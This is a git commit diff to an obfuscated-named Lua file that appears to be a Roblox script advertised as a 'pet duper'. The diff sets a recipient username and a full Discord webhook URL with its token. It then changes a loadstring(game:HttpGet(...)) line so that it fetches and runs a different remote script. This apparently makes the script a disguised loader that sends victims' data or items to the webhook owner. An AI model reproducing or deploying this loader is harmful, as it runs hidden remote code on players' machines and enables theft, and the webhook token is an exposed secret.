a54b2f1c1661d2f87363c5aa672de9033078aa79
paratok99 <134454398+paratok99@users.noreply.github.com>
2023-05-24 01:03:46 +0200

    Update obf_KP96uI5xP4dC82yVV9x7I9vJqJ45HNA4Y2lqfXT7LK5dpnhkbvdQAW8F4mRMUw09.lua

--- obf_KP96uI5xP4dC82yVV9x7I9vJqJ45HNA4Y2lqfXT7LK5dpnhkbvdQAW8F4mRMUw09.lua
+++ obf_KP96uI5xP4dC82yVV9x7I9vJqJ45HNA4Y2lqfXT7LK5dpnhkbvdQAW8F4mRMUw09.lua
@@ -2,4 +2,4 @@ _G.Username "armagedonn7"
 _G.HubName "pet duper"
 _G.WebhookUrl "https://discord.com/api/webhooks/1110699235571159100/kzJuMTWKywwFYzVctZR7-cvbfJDSwopPi0xranfjbaLDzsyMBd01XuloY5KqUpAK5tEy"
 
-loadstring(game:HttpGet("https://github.com/Jayiioceanii/PeakOnTop/blob/main/peak.lua"))()
+loadstring(game:HttpGet("https://github.com/paratok99/dupetr-oet/blob/main/obf_KP96uI5xP4dC82yVV9x7I9vJqJ45HNA4Y2lqfXT7LK5dpnhkbvdQAW8F4mRMUw09.lua"))()
